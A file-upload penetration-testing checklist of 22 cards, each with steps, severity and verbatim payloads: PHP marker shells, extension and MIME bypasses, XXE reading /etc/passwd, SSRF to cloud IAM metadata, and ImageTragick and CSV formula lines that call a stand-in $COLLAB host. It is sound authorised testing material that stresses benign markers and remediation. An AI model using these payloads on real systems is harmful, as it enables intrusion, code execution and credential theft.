# File Upload — Checklist

Expert per-attack **test-case matrix** for File Upload — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*22 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## UPL-001 — Enumerate EVERY upload point
**Test Category:** Recon &amp; Attack Surface · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** avatar/attachment, imports (CSV/XML/Office), 'import from URL', KYC/docs, admin theme/plugin/template, API/presigned/GraphQL

**Test Steps:** 1. Find all upload surfaces: avatars/attachments, CSV/XML/Office imports, 'import from URL', KYC docs, admin theme/plugin/template, API/presigned/GraphQL uploads.<br>2. Fingerprint stack/handler (httpx/Wappalyzer) and the serving host (app-origin vs subdomain vs sandbox CDN).<br>3. Stand up an OOB listener; prepare 2 test accounts for overwrite/IDOR proof.

**Expected Result:** A complete list of upload points, the stack, and the serving host per point.

**Payload Example:**

```
avatar upload ; POST /import (xlsx) ; import-from-url field ; admin plugin .zip
```

**Impact:** Import/admin/presigned points are higher-impact and often missed vs the obvious avatar.

**Tools:** Burp Suite Pro, httpx, interactsh

**References:** CWE-434; OWASP Testing Guide: Testing Upload of Malicious Files (WSTG-BUSL-09)

---

## UPL-002 — Baseline the upload — WHERE/URL/HOW + map controls
**Test Category:** Baseline (decides severity) · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Each upload point, before any attack

**Test Steps:** 1. Upload a valid file; record WHERE stored (path, guessable?, user-scoped?).<br>2. Fetch it back: WHAT URL serves it (app origin / subdomain / sandbox CDN) and HOW (Content-Type, Content-Disposition inline/attachment, X-Content-Type-Options).<br>3. Probe controls: client-only? extension allow/deny? MIME check? magic check? re-encoded? filename sanitized? size limit?<br>4. Decide the severity ceiling (web-root+handler=RCE / app-origin inline=XSS / parsed=XXE/SSRF / sandboxed=low).

**Expected Result:** The storage path, serving context, active controls, and severity ceiling are all known.

**Payload Example:**

```
stored /uploads/<id>.png ; served inline from app-origin ; nosniff MISSING ; ext-denylist only
```

**Impact:** Baseline decides which attack is even worth trying and the finding's true severity ceiling.

**Tools:** Burp Repeater, curl

**References:** CWE-434; PortSwigger Web Security Academy: File upload vulnerabilities

---

## UPL-003 — Client-side-only validation bypass
**Test Category:** Control Bypass · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Uploads validated only in JS

**Test Steps:** 1. If checks are client-side, tamper the request in Burp or call the endpoint directly.<br>2. Change filename/extension/Content-Type post-validation.<br>3. Confirm the server accepts what the JS would have blocked.

**Expected Result:** The server accepts a file the client-side validation rejected.

**Payload Example:**

```
bypass JS by editing the multipart request in Burp Repeater; POST directly to $URL
```

**Impact:** Client-only validation is no control - opens the door to every server-side bypass.

**Tools:** Burp Repeater

**References:** CWE-434; PortSwigger Web Security Academy: File upload vulnerabilities

---

## UPL-004 — MIME / Content-Type bypass
**Test Category:** Control Bypass · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Per-part Content-Type validation

**Test Steps:** 1. Classify the model: header-trust / ext-map / magic / image-decode / framework.<br>2. Lie: payload bytes + Content-Type: image/png while keeping an executing extension (shell.php).<br>3. Work the MIME matrix (docs/archives/text/octet-stream); mismatch the triple (CT vs extension vs magic) to find which tier trusts which.

**Expected Result:** A payload file is accepted under an allowed declared MIME type.

**Payload Example:**

```
filename=shell.php + Content-Type: image/png + GIF89a;<?php ... ?>
```

**Impact:** Defeats naive MIME allowlists - a prerequisite for landing the payload. Bypass control.

**Tools:** Burp Repeater

**References:** CWE-434; PayloadsAllTheThings/Upload Insecure Files

---

## UPL-005 — Multipart / parser-confusion structural tricks
**Test Category:** Control Bypass · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Front-end validator vs back-end framework multipart disagreement

**Test Steps:** 1. Missing Content-Type (default-allow); duplicate Content-Type (validator reads one, server the other).<br>2. Multiple file parts same name (validator checks #1 clean, server keeps #2); file[] array (only file[0] inspected).<br>3. Filename injection (two filenames, RFC-2231 filename*=, CRLF); Content-Transfer-Encoding: base64; nested multipart/mixed.

**Expected Result:** A structural disagreement lands an executable/parseable file past the validator.

**Payload Example:**

```
duplicate Content-Type: image/png + application/x-php ; two file parts (ok.png then shell.phtml)
```

**Impact:** Beats 'properly combined' magic+MIME+extension checks - the strongest bypass family.

**Tools:** Burp Repeater

**References:** CWE-434; HackTricks: File Upload

---

## UPL-006 — Extension denylist tricks
**Test Category:** Control Bypass · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Extension denylists

**Test Steps:** 1. Alt-execution extensions: .phtml/.pht/.phar/.php5/.pgif (PHP), .cer/.asa/.aspx (ASP), .jspx/.jsw (JSP).<br>2. Double-ext (shell.php.jpg / shell.jpg.php), case (.pHp), trailing dot/space/slash, %00 null, ;.jpg, ::$DATA (NTFS ADS).<br>3. Traversal that survives one strip: ....//shell.php.

**Expected Result:** A file with an executable extension is accepted despite the denylist.

**Payload Example:**

```
shell.phtml ; shell.php.jpg ; shell.php%00.jpg ; shell.aspx::$DATA ; shell.pHp
```

**Impact:** Denylists are inherently leaky - restores the executing extension. Bypass control.

**Tools:** Burp Repeater

**References:** CWE-434; PayloadsAllTheThings/Upload Insecure Files

---

## UPL-007 — Magic-byte / polyglot bypass
**Test Category:** Control Bypass · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Magic-byte / libmagic / image-decode validation

**Test Steps:** 1. Prepend a valid signature: GIF89a;, %PNG, %PDF-, PK\x03\x04 before the payload.<br>2. EXIF-comment payload (often survives re-encoding): exiftool -Comment='&lt;?php ...?&gt;'.<br>3. Image+code polyglot that is a valid image AND executes/XSSes.

**Expected Result:** A file passes magic-byte checks yet still carries an executable/scriptable payload.

**Payload Example:**

```
printf 'GIF89a;\n<?php echo "RCE-POC-".php_uname(); ?>' > shell.gif.php
```

**Impact:** Defeats content-sniffing controls; EXIF variant survives re-encoding. Bypass control.

**Tools:** exiftool, Burp

**References:** CWE-434; HackTricks: File Upload

---

## UPL-008 — Filename traversal &amp; filename-based XSS
**Test Category:** Control Bypass / Impact · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Filename used in storage path or reflected in the UI

**Test Steps:** 1. Path traversal in filename: ../, ....//, %2f, absolute/Windows path -&gt; write outside the intended dir.<br>2. Filename reflected unsanitized -&gt; stored XSS: "&gt;&lt;svg onload=alert(document.domain)&gt;.png.<br>3. Confirm where the filename lands (path vs HTML).

**Expected Result:** The filename escapes its directory or executes as XSS in the UI.

**Payload Example:**

```
filename="../../../../var/www/html/poc.php" ; filename="><svg onload=alert(document.domain)>.png
```

**Impact:** Arbitrary write location (-&gt; RCE) or stored XSS via filename - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-434; CWE-22; CWE-79; PayloadsAllTheThings/Upload Insecure Files

---

## UPL-009 — Config-file upload to force execution
**Test Category:** Control Bypass / Impact · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Directories where .htaccess/web.config/.user.ini apply; nginx+PHP-FPM

**Test Steps:** 1. Upload .htaccess (AddType application/x-httpd-php .jpg) or web.config (IIS handler) or .user.ini (auto_prepend_file=shell.gif) to force execution of image files.<br>2. nginx cgi.fix_pathinfo=1 path trick: GET /uploads/avatar.jpg/x.php executes the polyglot as PHP.<br>3. Then upload shell.jpg (polyglot) and request it.

**Expected Result:** An uploaded config file (or the FPM path trick) makes a benign-looking file execute.

**Payload Example:**

```
.htaccess: AddType application/x-httpd-php .jpg ; .user.ini: auto_prepend_file=shell.gif ; GET /uploads/x.jpg/x.php
```

**Impact:** Turns an image-only upload into RCE - Critical.

**Tools:** Burp Repeater

**References:** CWE-434; HackTricks: File Upload

---

## UPL-010 — RCE via web shell (benign marker)
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File landing in web-root with a matching handler

**Test Steps:** 1. Upload a marker shell of the server's language: &lt;?php echo "RCE-POC-".md5("poc")."-".php_uname(); ?&gt;.<br>2. Request the stored file's URL.<br>3. Seeing RCE-POC-&lt;hash&gt;-&lt;hostname&gt; = proven RCE. Do NOT add a real backdoor - marker only.

**Expected Result:** Requesting the uploaded file returns the executed marker output.

**Payload Example:**

```
<?php echo "RCE-POC-".md5("poc")."-".php_uname(); ?> -> GET /uploads/shell.phtml
```

**Impact:** Unauthenticated/authenticated RCE via upload - Critical, rarely duplicated.

**Tools:** Burp Repeater, poc/ shells

**References:** CWE-434; PortSwigger Web Security Academy: File upload vulnerabilities

---

## UPL-011 — TOCTOU race — execute before validate/delete
**Test Category:** Impact — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Servers that save-then-validate/scan/delete

**Test Steps:** 1. Upload the shell, then hammer parallel GETs to its URL during the save-&gt;validate-&gt;delete window.<br>2. Success = a 200 with your RCE marker BEFORE the 404.<br>3. Variant: LFI + phpinfo() temp-file race (leak /tmp/phpXXXXXX, include before deletion).

**Expected Result:** A request hits and executes the shell before the server deletes/quarantines it.

**Payload Example:**

```
URL=/uploads/shell.php ; for i in $(seq 1 400); do curl -s "$URL?c=echo RCE-POC" & done; wait
```

**Impact:** RCE even when the server validates-and-deletes - Critical, easily missed.

**Tools:** Burp Turbo Intruder, parallel curl

**References:** CWE-434; CWE-367; HackTricks: File Upload

---

## UPL-012 — Stored XSS via SVG/HTML (inline from app origin)
**Test Category:** Impact — Stored XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** SVG/HTML served INLINE from the APP ORIGIN (not a sandbox CDN)

**Test Steps:** 1. Upload an SVG/HTML with script: &lt;svg onload=alert(document.domain)&gt;.<br>2. Confirm it is served inline from the app origin (Content-Disposition not attachment, nosniff missing/irrelevant for SVG).<br>3. alert(document.domain) firing on the app origin = stored XSS.

**Expected Result:** The uploaded SVG/HTML executes JS in the app's origin when viewed.

**Payload Example:**

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>alert(document.domain)</script></svg>
```

**Impact:** Stored XSS on the app origin -&gt; session/account theft. High (NOT if sandbox-CDN served).

**Tools:** Burp Repeater

**References:** CWE-434; CWE-79; PortSwigger Web Security Academy: File upload vulnerabilities

---

## UPL-013 — XXE via SVG / Office upload
**Test Category:** Impact — XXE · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** SVG or OOXML (DOCX/XLSX/PPTX) parsed server-side

**Test Steps:** 1. SVG XXE: DOCTYPE entity reading file:///etc/passwd into a &lt;text&gt; node (in-band) or param-entity OOB.<br>2. Office XXE: inject DOCTYPE into word/document.xml, re-zip, upload to a parse/preview feature.<br>3. Benign file first; watch OOB for blind.

**Expected Result:** The parser reads a local file or fires an OOB callback.

**Payload Example:**

```
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>
```

**Impact:** File read / SSRF via parsed upload - High/Critical. Works even with allowlist+sandbox.

**Tools:** poc/make_svg_xxe.py, oxml_xxe

**References:** CWE-434; CWE-611; HackTricks: File Upload

---

## UPL-014 — SSRF via 'import from URL'
**Test Category:** Impact — SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Server-side fetch of a user-supplied URL

**Test Steps:** 1. Point the fetch at cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/.<br>2. Internal services / OOB confirm; file:// for LFI if allowed.<br>3. Bypasses: 127.0.0.1.nip.io, decimal IP 2130706433, [::1], attacker-redirect-to-internal.

**Expected Result:** The server fetches your internal/metadata URL; IAM creds or internal content returned.

**Payload Example:**

```
import-url = http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** SSRF -&gt; cloud IAM credential theft = Critical.

**Tools:** Burp Collaborator, SSRFmap

**References:** CWE-434; CWE-918; PortSwigger Web Security Academy: File upload vulnerabilities

---

## UPL-015 — Processor RCE / file-read (ImageMagick / exiftool / Ghostscript / ffmpeg)
**Test Category:** Impact — Processor CVE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Uploads that are resized/converted/transcoded/thumbnailed

**Test Steps:** 1. Fingerprint the processor + version (errors/headers/timing).<br>2. ImageMagick ImageTragick (CVE-2016-3714) MVG delegate RCE; CVE-2022-44268 PNG arbitrary file read; exiftool DjVu RCE (CVE-2021-22204); Ghostscript %pipe% (CVE-2023-36664); ffmpeg HLS .m3u8 file-read/SSRF.<br>3. A VALID file of an allowed type is the payload - works past allowlist+sandbox+re-encode. Benign OOB/file only.

**Expected Result:** The processor executes your benign command or reads a benign file into the output.

**Payload Example:**

```
MVG: fill 'url(https://x"|curl http://$COLLAB/imagetragick)' ; m3u8 -> file:///etc/hostname
```

**Impact:** Processing RCE / SSRF-&gt;metadata = Critical; processing file-read = High. Rarely duplicated.

**Tools:** ImageMagick, exiftool, Ghostscript, ffmpeg

**References:** CWE-434; ImageTragick CVE-2016-3714; exiftool CVE-2021-22204; HackTricks: File Upload

---

## UPL-016 — Zip Slip &amp; symlink archive extraction
**Test Category:** Impact — Archive · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Features that extract uploaded zip/tar archives

**Test Steps:** 1. Zip Slip: an entry path ../../../../var/www/html/poc.php writes outside the extract dir -&gt; RCE.<br>2. Symlink archive: tar stores a symlink ENTRY (do NOT use -h) -&gt; app reads/overwrites host files (/etc/passwd, .env, a served JS asset).<br>3. Benign marker in the written file.

**Expected Result:** Extraction writes/reads outside the intended directory via traversal/symlink.

**Payload Example:**

```
zip entry: ../../../../var/www/html/poc.php ; ln -s /etc/passwd link && tar -cf evil.tar link
```

**Impact:** RCE (Zip Slip) or arbitrary read/overwrite (symlink) - Critical/High.

**Tools:** poc/make_zipslip.py, tar

**References:** CWE-434; CWE-22; HackTricks: File Upload

---

## UPL-017 — Overwrite / IDOR of another user's file or trusted config
**Test Category:** Impact — Overwrite/IDOR · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N)

**Where to Test / Injection Point:** Storage keys that are guessable or user-controlled

**Test Steps:** 1. With 2 accounts, overwrite another user's file / shared asset / trusted config by controlling the storage key/path.<br>2. Confirm cross-user impact (their avatar/document replaced).<br>3. Overwriting a served JS/HTML asset -&gt; stored XSS / supply-chain.

**Expected Result:** An upload overwrites a file belonging to another user or a trusted served asset.

**Payload Example:**

```
key = /avatars/<victim_id>.png ; overwrite /assets/app.js served to all users
```

**Impact:** Cross-user tampering / stored XSS / supply-chain via asset overwrite - High/Critical (NOT self-only).

**Tools:** Burp Repeater

**References:** CWE-434; CWE-639; HackTricks: File Upload

---

## UPL-018 — Pre-signed URL / direct-to-cloud upload abuse
**Test Category:** Impact — Cloud · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** S3/GCS presigned PUT flows

**Test Steps:** 1. Intercept the presign response; craft the PUT yourself altering key / Content-Type / ACL.<br>2. KEY control: key=../served-asset or another user's avatar -&gt; overwrite -&gt; stored XSS/supply-chain. CT control: text/html or image/svg+xml served inline -&gt; stored XSS. ACL: x-amz-acl: public-read.<br>3. Over-broad presign (whole bucket / long TTL / any key) -&gt; write beyond your folder.

**Expected Result:** The presigned PUT writes an unexpected key/type/ACL beyond the intended object.

**Payload Example:**

```
curl -X PUT '<presigned>' -H 'Content-Type: text/html' -H 'x-amz-acl: public-read' --data-binary @poc.html
```

**Impact:** Asset overwrite / world-readable objects / stored XSS via cloud misconfig - High/Critical.

**Tools:** Burp Repeater, aws cli

**References:** CWE-434; CWE-639; HackTricks: File Upload

---

## UPL-019 — CSV / formula injection in imports
**Test Category:** Impact — CSV Injection · **Severity:** Medium · **CVSS:** 5.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** CSV/XLSX imports later exported &amp; opened by staff

**Test Steps:** 1. Inject a formula that fires when exported and opened: =HYPERLINK("//$COLLAB/?c="&amp;A1) ; =cmd|'/c calc'!A1.<br>2. Confirm the value is stored and re-exported verbatim.<br>3. Impact realizes in the victim's spreadsheet client (staff).

**Expected Result:** The imported formula is exported unescaped and executes in a spreadsheet client.

**Payload Example:**

```
=HYPERLINK("//$COLLAB/?c="&A1,"click") ; @SUM(1+1)*cmd|'/c calc'!A1
```

**Impact:** Client-side code exec / data exfil against staff who open the export - Medium/High.

**Tools:** Burp Repeater

**References:** CWE-434; CWE-1236; HackTricks: File Upload

---

## UPL-020 — DoS — pixel flood / zip bomb (scope permitting)
**Test Category:** Impact — DoS · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)

**Where to Test / Injection Point:** Image decoders / archive extractors; AUTHORIZE first

**Test Steps:** 1. Pixel flood: a tiny image with enormous declared dimensions -&gt; memory blowup on decode.<br>2. Zip bomb: nested/repetitive archive with a huge expansion RATIO.<br>3. Demonstrate the RATIO safely; never exhaust prod.

**Expected Result:** A tiny crafted file causes disproportionate memory/CPU on processing.

**Payload Example:**

```
42x42-byte PNG declaring 64000x64000 ; nested zip bomb (show ratio only)
```

**Impact:** Availability impact from one small file - Medium/High (scope required, prove ratio not outage).

**Tools:** manual

**References:** CWE-434; CWE-400; HackTricks: File Upload

---

## UPL-021 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: 'it accepted my file' (acceptance != impact); SVG-XSS served from a sandbox CDN (low ceiling - don't inflate); stored-but-not-executed; self-only overwrite.<br>2. REQUIRE: confirmed execution/parse/serve AND the serving context (app-origin for XSS/RCE).<br>3. Climb to the highest impact the context allows before writing up.

**Expected Result:** Only candidates with confirmed execution/parse/serve in the right context survive.

**Payload Example:**

```
accepted-only = not a bug ; SVG XSS on sandbox-CDN = low ; stored-not-executed = keep digging
```

**Impact:** Protects credibility; upload is dense with 'it accepted my file' false positives.

**Tools:** manual

**References:** CWE-434; PortSwigger Web Security Academy: File upload vulnerabilities

---

## UPL-022 — Client-facing impact &amp; SAFE marker PoC
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Title names the impact ('Unauthenticated RCE via avatar upload'); lead with who is affected.<br>2. Provide the crafted file, the upload request, and the request/response proving impact (marker output / OOB hit / rendered XSS) + screenshot.<br>3. Set CVSS 3.1 + the outcome CWE (434 primary; +611/918/79/22). Remediation: allowlist by validated content, store outside web-root / on a sandbox origin with Content-Disposition: attachment + nosniff, random non-executable names, re-encode images, size limits, scan archives.<br>4. Benign marker only; own accounts; delete uploaded artifacts; de-dupe.

**Expected Result:** A reproducible, correctly-rated, safe marker PoC with clear remediation.

**Payload Example:**

```
PoC: crafted file + upload request + impact proof (RCE marker / OOB / XSS) + CVSS + CWE + remediation.
```

**Impact:** Converts execution/parse/serve into a defensible Critical/High report at the right severity.

**Tools:** CVSS calculator, FILE_UPLOAD_REPORT_TEMPLATE.md

**References:** CWE-434; CWE-611; CWE-918; CWE-79; CWE-22; FIRST CVSS v3.1; OWASP Testing Guide: Testing Upload of Malicious Files (WSTG-BUSL-09)  |  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; ImageTragick; OWASP File Upload Cheat Sheet

---
